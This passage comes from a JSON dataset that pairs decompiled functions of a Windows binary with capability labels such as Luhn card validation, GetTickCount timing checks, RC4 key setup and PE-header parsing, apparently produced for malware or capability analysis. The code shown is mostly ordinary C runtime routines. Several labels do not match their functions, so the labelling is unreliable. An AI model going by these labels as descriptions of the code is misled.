fcn.140008040(arg2, 0, arg3);\n            }\n        }\n        uVar3 = 0x22;\n    }\n    else {\n        uVar3 = 0x16;\n    }\n    *(in_stack_00000028 + 0x2c) = uVar3;\n    *(in_stack_00000028 + 0x30) = 1;\n    fcn.14000bf58(0, 0, 0, 0);\n    return uVar3;\n}\n",
        "token_count": 898
    },
    "14001e4d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14001e4d0(uint16_t *arg1, uint8_t *arg2, uint64_t arg3, int64_t arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    ulong uStackX8;\n    uint8_t *puStackX16;\n    \n    uVar3 = 0;\n    if (arg1 != NULL) {\n        if (arg3 == 0) {\n            return 0;\n        }\n        *arg1 = 0;\n    }\n    puStackX16 = arg2;\n    if (arg2 == NULL) {\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        uVar3 = 0xffffffffffffffff;\n    }\n    else {\n        if (*(arg4 + 0x28) == '\\0') {\n            fcn.140010150(arg4);\n        }\n        iVar4 = *(arg4 + 0x18);\n        uVar1 = *(iVar4 + 0xc);\n        if (uVar1 == 0xfde9) {\n            uStackX8 = 0;\n            uVar3 = fcn.140026580(arg1, &puStackX16, arg3, &uStackX8);\n        }\n        else {\n            if (arg1 == NULL) {\n                uVar3 = 0xffffffffffffffff;\n                if (*(iVar4 + 0x138) == 0) {\n                    do {\n                        uVar3 = uVar3 + 1;\n                    } while (puStackX16[uVar3] != 0);\n                    return uVar3;\n                }\n                iVar2 = fcn.140020210(uVar1, 9);\n                iVar4 = iVar2;\n                if (iVar4 == 0) {\n                    *(arg4 + 0x30) = 1;\n                    *(arg4 + 0x2c) = 0x2a;\n                    return 0xffffffffffffffff;\n                }\n            }\n            else {\n                if (*(iVar4 + 0x138) == 0) {\n                    if (arg3 == 0) {\n                        return 0;\n                    }\n                    do {\n                        *arg1 = puStackX16[uVar3];\n                        if (puStackX16[uVar3] == 0) {\n                            return uVar3;\n                        }\n                        uVar3 = uVar3 + 1;\n                        arg1 = arg1 + 1;\n                    } while (uVar3 < arg3);\n                    return uVar3;\n                }\n                uVar6 = arg3;\n                iVar2 = fcn.140020210(uVar1, 9);\n                iVar4 = iVar2;\n                if (iVar4 == 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar2 == 0x7a) {\n                        arg3 = arg3 & 0xffffffff;\n                        puVar5 = puStackX16;\n                        while (uVar6 != 0) {\n                            uVar6 = arg3 - 1;\n                            arg3 = uVar6;\n                            if (*puVar5 == 0) break;\n                            if ((*(**(arg4 + 0x18) + *puVar5 * 2) < 0) && (puVar5 = puVar5 + 1,  *puVar5 == 0))\n                            goto code_r0x00014001e5f4;\n                            puVar5 = puVar5 + 1;\n                        }\n                        iVar2 = fcn.140020210(*(*(arg4 + 0x18) + 0xc), 1);\n                        if (iVar2 != 0) {\n                            return iVar2;\n                        }\n                    }\ncode_r0x00014001e5f4:\n                    *(arg4 + 0x30) = 1;\n                    *(arg4 + 0x2c) = 0x2a;\n                    *arg1 = 0;\n                    return 0xffffffffffffffff;\n                }\n            }\n            uVar3 = iVar4 - 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 953
    },
    "14001ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.14001ff00(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.140026a84();\n    return uVar1 & 0x300;\n}\n",
        "token_count": 48
    },
    "1400205a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.1400205a0(int16_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    int16_t *piVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    if (arg4 == 0) {\n        if (arg1 == NULL) {\n            if (arg2 == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0001400205f3:\n            if (arg2 != 0) {\n                if (arg4 == 0) {\n                    *arg1 = 0;\n                    return 0;\n                }\n                if (arg3 != 0) {\n                    piVar4 = arg1;\n                    iVar3 = arg4;\n                    iVar7 = arg2;\n                    if (arg4 == -1) {\n                        do {\n                            iVar1 = *((arg3 - arg1) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if (iVar1 == 0) {\n                                return 0;\n                            }\n                            iVar7 = iVar7 + -1;\n                        } while (iVar7 != 0);\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar3;\n                            iVar1 = *((arg3 - arg1) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if (iVar1 == 0) {\n                                return 0;\n                            }\n                            iVar7 = iVar7 + -1;\n                        } while ((iVar7 != 0) && (iVar3 = iVar6 + -1,  iVar6 + -1 != 0));\n                        iVar3 = iVar6 + -1;\n                        if (iVar7 == 0) {\n                            iVar3 = iVar6;\n                        }\n                        if (iVar3 == 0) {\n                            *piVar4 = 0;\n                        }\n                    }\n                    if (iVar7 != 0) {\n                        return 0;\n                    }\n                    if (arg4 == -1) {\n                        arg1[arg2 + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg1 = 0;\n                    puVar2 = fcn.140012c78();\n                    uVar5 = 0x22;\n                    goto code_r0x0001400205d1;\n                }\n                *arg1 = 0;\n            }\n        }\n    }\n    else if (arg1 != NULL) goto code_r0x0001400205f3;\n    puVar2 = fcn.140012c78();\n    uVar5 = 0x16;\ncode_r0x0001400205d1:\n    *puVar2 = uVar5;\n    fcn.14000c028();\n    return uVar5;\n}\n",
        "token_count": 645
    },
    "1400206b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.1400206b0(int16_t *arg1, int64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t *puVar4;\n    uint64_t uVar5;\n    uint64_t arg1_00;\n    \n    if (arg1 == NULL) {\n        if (*(arg2 + 0x28) != '\\0') {\n            fcn.140019b4c(*(arg2 + 0x10));\n            *(arg2 + 0x28) = 0;\n        }\n        *(arg2 + 0x10) = 0;\n        *(arg2 + 0x18) = 0;\n    }\n    else {\n        if (*arg1 != 0) {\n            iVar2 = fcn.14002026c(arg4, 0, arg1, 0xffffffff);\n            arg1_00 = iVar2;\n            if (iVar2 != 0) {\n                if (*(arg2 + 0x18) < arg1_00) {\n                    if (*(arg2 + 0x28) != '\\0') {\n                        fcn.140019b4c(*(arg2 + 0x10));\n                        *(arg2 + 0x28) = 0;\n                    }\n                    iVar3 = fcn.14001a93c(arg1_00);\n                    *(arg2 + 0x10) = iVar3;\n                    uVar1 = ~-(iVar3 != 0) & 0xc;\n                    uVar5 = 0;\n                    if (uVar1 == 0) {\n                        uVar5 = arg1_00;\n                    }\n                    *(arg2 + 0x28) = uVar1 == 0;\n                    *(arg2 + 0x18) = uVar5;\n                    if (uVar1 != 0) {\n                        return uVar1;\n                    }\n                }\n                iVar2 = fcn.14002026c(arg4, 0, arg1, 0xffffffff);\n                if (iVar2 != 0) {\n                    *(arg2 + 0x20) = iVar2 + -1;\n                    return 0;\n                }\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.140012bec(uVar1);\n            puVar4 = fcn.140012c78();\n            return *puVar4;\n        }\n        if (*(arg2 + 0x18) == 0) {\n            if (*(arg2 + 0x28) != '\\0') {\n                fcn.140019b4c(*(arg2 + 0x10));\n                *(arg2 + 0x28) = 0;\n            }\n            iVar3 = fcn.14001a93c(1);\n            *(arg2 + 0x10) = iVar3;\n            uVar1 = ~-(iVar3 != 0) & 0xc;\n            *(arg2 + 0x28) = uVar1 == 0;\n            *(arg2 + 0x18) = uVar1 == 0;\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n        }\n        **(arg2 + 0x10) = 0;\n    }\n    *(arg2 + 0x20) = 0;\n    return 0;\n}\n",
        "token_count": 748
    },
    "1400212d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400212d4(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    int64_t iVar4;\n    \n    fcn.140008040(arg1 + 0x18, 0, 0x101);\n    iVar2 = 0;\n    *(arg1 + 4) = 0;\n    *(arg1 + 0x220) = 0;\n    puVar3 = arg1 + 0xc;\n    for (iVar1 = 6; iVar4 = iVar2,  iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    do {\n        iVar1 = iVar4 + 1;\n        *(arg1 + iVar4 + 0x18) = *(iVar4 + 0x14003e6e8);\n        iVar4 = iVar1;\n    } while (iVar1 < 0x101);\n    do {\n        iVar1 = iVar2 + 1;\n        *(arg1 + iVar2 + 0x119) = *(iVar2 + 0x14003e7e9);\n        iVar2 = iVar1;\n    } while (iVar1 < 0x100);\n    return;\n}\n",
        "token_count": 293
    },
    "1400218d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.1400218dc(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong arg3;\n    int64_t iVar2;\n    ulong in_RDX;\n    ulong lpFlsData;\n    int32_t *lpMem;\n    \n    iVar2 = fcn.140019774(arg1, in_RDX);\n    lpFlsData = 0x140040910;\n    if (((*(iVar2 + 0x3a8) & *0x14003e520) == 0) || (*(iVar2 + 0x90) == 0)) {\n        fcn.140011ea4(5);\n        lpMem = *(iVar2 + 0x88);\n        if (lpMem != *0x140040910) {\n            if (lpMem != NULL) {\n                LOCK();\n                iVar1 = *lpMem;\n                *lpMem = *lpMem + -1;\n                if ((iVar1 == 1) && (lpMem != 0x14003e6d0)) {\n                    fcn.140019b4c(lpMem);\n                }\n            }\n            lpMem = *0x140040910;\n            *(iVar2 + 0x88) = *0x140040910;\n            LOCK();\n            *lpMem = *lpMem + 1;\n        }\n        fcn.140011ef8(5);\n    }\n    else {\n        lpMem = *(iVar2 + 0x88);\n    }\n    if (lpMem != NULL) {\n        return lpMem;\n    }\n    fcn.140012b4c();\n    if (*0x14004091c == '\\0') {\n        *0x140040908 = 0x14003ea10;\n        *0x140040910 = 0x14003e6d0;\n        *0x140040900 = 0x14003e900;\n        arg3 = fcn.140019848(0x14003e900, lpFlsData);\n        fcn.140021554(0xfffffffd, CONCAT71(lpFlsData >> 8, 1), arg3, 0x140040910);\n        *0x14004091c = '\\x01';\n    }\n    return 0x1;\n}\n",
        "token_count": 490
    },
    "140021c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140021c40(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *arg3;\n    int64_t iVar3;\n    int16_t *piVar5;\n    uint64_t uVar6;\n    int64_t iVar4;\n    \n    arg3 = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    if (arg3 != NULL) {\n        iVar1 = *arg3;\n        piVar5 = arg3;\n        while (iVar1 != 0) {\n            iVar3 = -1;\n            do {\n                iVar4 = iVar3;\n                iVar3 = iVar4 + 1;\n            } while (piVar5[iVar3] != 0);\n            piVar5 = piVar5 + iVar4 + 2;\n            iVar1 = *piVar5;\n        }\n        uVar6 = piVar5 + (2 - arg3) >> 1;\n        iVar2 = fcn.14002026c(0, 0, arg3, uVar6 & 0xffffffff);\n        if (iVar2 != 0) {\n            iVar3 = fcn.14001a93c(iVar2);\n            if (iVar3 != 0) {\n                iVar2 = fcn.14002026c(0, 0, arg3, uVar6 & 0xffffffff);\n                if (iVar2 == 0) {\n                    fcn.140019b4c(iVar3);\n                    iVar3 = 0;\n                }\n                else {\n                    fcn.140019b4c(0);\n                }\n                (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg3);\n                return iVar3;\n            }\n            fcn.140019b4c(0);\n        }\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg3);\n    }\n    return 0;\n}\n",
        "token_count": 410
    },
    "14002251": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140022514(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        if (*(arg1 + 0x18) != *0x14003e1a8) {\n            fcn.140019b4c(*(arg1 + 0x18));\n        }\n        if (*(arg1 + 0x20) != *0x14003e1b0) {\n            fcn.140019b4c(*(arg1 + 0x20));\n        }\n        if (*(arg1 + 0x28) != *0x14003e1b8) {\n            fcn.140019b4c(*(arg1 + 0x28));\n        }\n        if (*(arg1 + 0x30) != *0x14003e1c0) {\n            fcn.140019b4c(*(arg1 + 0x30));\n        }\n        if (*(arg1 + 0x38) != *0x14003e1c8) {\n            fcn.140019b4c(*(arg1 + 0x38));\n        }\n        if (*(arg1 + 0x40) != *0x14003e1d0) {\n            fcn.140019b4c(*(arg1 + 0x40));\n        }\n        if (*(arg1 + 0x48) != *0x14003e1d8) {\n            fcn.140019b4c(*(arg1 + 0x48));\n        }\n        if (*(arg1 + 0x68) != *0x14003e1f8) {\n            fcn.140019b4c(*(arg1 + 0x68));\n        }\n        if (*(arg1 + 0x70) != *0x14003e200) {\n            fcn.140019b4c(*(arg1 + 0x70));\n        }\n        if (*(arg1 + 0x78) != *0x14003e208) {\n            fcn.140019b4c(*(arg1 + 0x78));\n        }\n        if (*(arg1 + 0x80) != *0x14003e210) {\n            fcn.140019b4c(*(arg1 + 0x80));\n        }\n        if (*(arg1 + 0x88) != *0x14003e218) {\n            fcn.140019b4c(*(arg1 + 0x88));\n        }\n        if (*(arg1 + 0x90) != *0x14003e220) {\n            fcn.140019b4c(*(arg1 + 0x90));\n        }\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "140022b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140022b54(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x14003e190) {\n            fcn.140019b4c(*arg1);\n        }\n        if (arg1[1] != *0x14003e198) {\n            fcn.140019b4c(arg1[1]);\n        }\n        if (arg1[2] != *0x14003e1a0) {\n            fcn.140019b4c(arg1[2]);\n        }\n        if (arg1[0xb] != *0x14003e1e8) {\n            fcn.140019b4c(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x14003e1f0) {\n            fcn.140019b4c(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "140022ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140022ea4(ulong *arg1)\n\n{\n    ulong *puVar1;\n    int64_t in_RDX;\n    \n    puVar1 = arg1 + in_RDX;\n    if (arg1 != puVar1) {\n        do {\n            fcn.140019b4c(*arg1);\n            arg1 = arg1 + 1;\n        } while (arg1 != puVar1);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "14002502": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.14002502c(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if (arg1 != 0) {\n        iVar4 = 0;\n        iVar5 = 0xe3;\n        do {\n            iVar2 = (iVar5 + iVar4) / 2;\n            iVar3 = fcn.140027f64(arg1, *(iVar2 * 0x10 + 0x140036600), 0x55);\n            if (iVar3 == 0) {\n                uVar1 = *(iVar2 * 0x10 + 0x140036608);\n                if (uVar1 < 0) {\n                    return 0;\n                }\n                if (0xe3 < uVar1) {\n                    return 0;\n                }\n                return *(uVar1 * 0x10 + 0x140034bb0);\n            }\n            if (iVar3 < 0) {\n                iVar5 = iVar2 + -1;\n            }\n            else {\n                iVar4 = iVar2 + 1;\n            }\n        } while (iVar4 <= iVar5);\n    }\n    return 0;\n}\n",
        "token_count": 281
    },
    "14002653": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14002653c(ushort *arg1)\n\n{\n    uint64_t uVar1;\n    ulong in_RDX;\n    ulong in_R8;\n    ulong in_R9;\n    uint32_t auStack24 [4];\n    \n    uVar1 = fcn.140028968(auStack24, in_RDX, in_R8, in_R9);\n    if (uVar1 < 5) {\n        if (0xffff < auStack24[0]) {\n            auStack24[0] = 0xfffd;\n        }\n        if (arg1 != NULL) {\n            *arg1 = auStack24[0];\n        }\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "14002691": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.140026914(char *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    if (arg4 == 0) {\n        if (arg1 == NULL) {\n            if (arg2 == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x000140026967:\n            if (arg2 != 0) {\n                if (arg4 == 0) {\n                    *arg1 = '\\0';\n                    return 0;\n                }\n                if (arg3 != 0) {\n                    pcVar4 = arg1;\n                    iVar3 = arg4;\n                    iVar7 = arg2;\n                    if (arg4 == -1) {\n                        do {\n                            cVar1 = pcVar4[arg3 - arg1];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar1 == '\\0') {\n                                return 0;\n                            }\n                            iVar7 = iVar7 + -1;\n                        } while (iVar7 != 0);\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar3;\n                            cVar1 = pcVar4[arg3 - arg1];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar1 == '\\0') {\n                                return 0;\n                            }\n                            iVar7 = iVar7 + -1;\n                        } while ((iVar7 != 0) && (iVar3 = iVar6 + -1,  iVar6 + -1 != 0));\n                        iVar3 = iVar6 + -1;\n                        if (iVar7 == 0) {\n                            iVar3 = iVar6;\n                        }\n                        if (iVar3 == 0) {\n                            *pcVar4 = '\\0';\n                        }\n                    }\n                    if (iVar7 != 0) {\n                        return 0;\n                    }\n                    if (arg4 == -1) {\n                        arg1[arg2 + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg1 = '\\0';\n                    puVar2 = fcn.140012c78();\n                    uVar5 = 0x22;\n                    goto code_r0x000140026945;\n                }\n                *arg1 = '\\0';\n            }\n        }\n    }\n    else if (arg1 != NULL) goto code_r0x000140026967;\n    puVar2 = fcn.140012c78();\n    uVar5 = 0x16;\ncode_r0x000140026945:\n    *puVar2 = uVar5;\n    fcn.14000c028();\n    return uVar5;\n}\n",
        "token_count": 630
    },
    "14002963": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140029630(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    fcn.140029650(param_1, param_2, param_3, 0x1b);\n    return;\n}\n",
        "token_count": 54
    },
    "14000e41": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14000e410(char *arg1, int64_t *arg2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    int64_t iVar4;\n    \n    cVar1 = *arg1;\n    while ((cVar1 != '\\0' && (cVar1 != ***(*arg2 + 0xf8)))) {\n        arg1 = arg1 + 1;\n        cVar1 = *arg1;\n    }\n    if (cVar1 != '\\0') {\n        do {\n            arg1 = arg1 + 1;\n            pcVar2 = arg1;\n            if (*arg1 == '\\0') break;\n        } while ((*arg1 + 0xbbU & 0xdf) != 0);\n        do {\n            pcVar3 = pcVar2;\n            pcVar2 = pcVar3 + -1;\n        } while (*pcVar2 == '0');\n        pcVar3 = pcVar3 + -2;\n        if (*pcVar2 != ***(*arg2 + 0xf8)) {\n            pcVar3 = pcVar2;\n        }\n        iVar4 = arg1 - pcVar3;\n        do {\n            cVar1 = pcVar3[iVar4];\n            pcVar3 = pcVar3 + 1;\n            *pcVar3 = cVar1;\n        } while (cVar1 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "14002031": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.14002031c(uint16_t *arg1, uint16_t *arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    do {\n        uVar1 = *arg1;\n        arg1 = arg1 + 1;\n        uVar2 = *arg2;\n        arg2 = arg2 + 1;\n        uVar4 = uVar1 + 0x20;\n        if (0x19 < uVar1 - 0x41) {\n            uVar4 = uVar1;\n        }\n        uVar3 = uVar2 + 0x20;\n        if (0x19 < uVar2 - 0x41) {\n            uVar3 = uVar2;\n        }\n    } while ((uVar4 == uVar3) && (uVar4 != 0));\n    return;\n}\n",
        "token_count": 207
    },
    "140027c6": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "set environment variable"
        ],
        "decompiled_code": "\nuint64_t fcn.140027c64(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uchar auStackX24 [8];\n    int64_t iStack152;\n    int64_t iStack144;\n    char cStack128;\n    ulong uStack120;\n    ulong uStack112;\n    uint64_t uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    char cStack80;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    char cStack32;\n    \n    uVar3 = 0;\n    uStack72 = 0;\n    uStack64 = 0;\n    uStack56 = 0;\n    uStack48 = 0;\n    uStack40 = 0;\n    cStack32 = '\\0';\n    uStack120 = 0;\n    uStack112 = 0;\n    uStack104 = 0;\n    uStack96 = 0;\n    uStack88 = 0;\n    cStack80 = '\\0';\n    fcn.140012c98(&iStack152, 0);\n    uVar2 = 0xfde9;\n    if (*(iStack144 + 0xc) == 0xfde9) {\n        if (cStack128 != '\\0') {\n            *(iStack152 + 0x3a8) = *(iStack152 + 0x3a8) & 0xfffffffd;\n        }\n        uVar4 = 0xfde9;\n    }\n    else {\n        iVar1 = fcn.140019e50();\n        if (iVar1 == 0) {\n            if (cStack128 != '\\0') {\n                *(iStack152 + 0x3a8) = *(iStack152 + 0x3a8) & 0xfffffffd;\n            }\n            uVar4 = 1;\n        }\n        else {\n            uVar4 = uVar3;\n            if (cStack128 != '\\0') {\n                *(iStack152 + 0x3a8) = *(iStack152 + 0x3a8) & 0xfffffffd;\n            }\n        }\n    }\n    iVar1 = fcn.1400157e0(arg1, &uStack72, auStackX24, uVar4);\n    uVar4 = uVar3;\n    if (iVar1 == 0) {\n        fcn.140012c98(&iStack152, 0);\n        if (*(iStack144 + 0xc) == 0xfde9) {\n            if (cStack128 != '\\0') {\n                *(iStack152 + 0x3a8) = *(iStack152 + 0x3a8) & 0xfffffffd;\n            }\n        }\n        else {\n            iVar1 = fcn.140019e50();\n            if (iVar1 == 0) {\n                if (cStack128 != '\\0') {\n                    *(iStack152 + 0x3a8) = *(iStack152 + 0x3a8) & 0xfffffffd;\n                }\n                uVar2 = 1;\n            }\n            else {\n                if (cStack128 != '\\0') {\n                    *(iStack152 + 0x3a8) = *(iStack152 + 0x3a8) & 0xfffffffd;\n                }\n                uVar2 = 0;\n            }\n        }\n        iVar1 = fcn.1400157e0(arg2, &uStack120, auStackX24, uVar2);\n        uVar4 = uStack104;\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(uStack56, uStack104);\n            uVar3 = uVar2;\n        }\n    }\n    if (cStack80 != '\\0') {\n        fcn.140019b4c(uVar4);\n    }\n    if (cStack32 != '\\0') {\n        fcn.140019b4c(uStack56);\n    }\n    return uVar3;\n}\n",
        "token_count": 923
    },
    "1400087a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.1400087a4(int64_t arg1, uint64_t *arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    if (arg1 != 0) {\n        iVar5 = *(arg1 + 0x18);\n        uVar2 = arg2[1];\n        if (iVar5 + uVar2 != 0) {\n            uVar4 = 0;\n            if (*(arg1 + 0x14) != 0) {\n                do {\n                    if (*arg2 < *(iVar5 + uVar4 * 8 + uVar2) + uVar2) break;\n                    uVar3 = uVar4 + 1;\n                    uVar4 = uVar3;\n                } while (uVar3 < *(arg1 + 0x14));\n                if (uVar4 != 0) {\n                    return *(iVar5 + (uVar4 - 1) * 8 + 4 + uVar2);\n                }\n            }\n            return 0xffffffff;\n        }\n    }\n    fcn.140012b4c();\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 292
    },
    "140011f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.140011f40(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x140040928, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.1400184b4();\n        } while ((iVar1 != 0) && (iVar1 = fcn.140015da8(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.140012c78();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 197
    },
    "1400169e": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.1400169ec(uint64_t arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    char cVar3;\n    \n    arg1 = arg1 & 0xffffffff;\n    cVar3 = fcn.140016a20();\n    if (cVar3 != '\\0') {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar2, arg1);\n    }\n    fcn.140016a50(arg1);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(arg1);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 158
    },
    "140016ae": {
        "rules": [
            "parse PE header"
        ],
        "decompiled_code": "\nvoid fcn.140016ae8(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    ulong uStack40;\n    uint *puStack32;\n    int32_t *piStack24;\n    uchar *puStack16;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 2;\n    uStack40 = 0xfffffffffffffffe;\n    piVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.140016a50(arg1);\n    }\n    auStackX32[0] = 0;\n    puStack32 = auStackX16;\n    piStack24 = aiStackX24;\n    puStack16 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.140016820(auStack56, auStack48, &puStack32, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.1400169ec(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 430
    },
    "140016b3": {
        "rules": [
            "parse PE header"
        ],
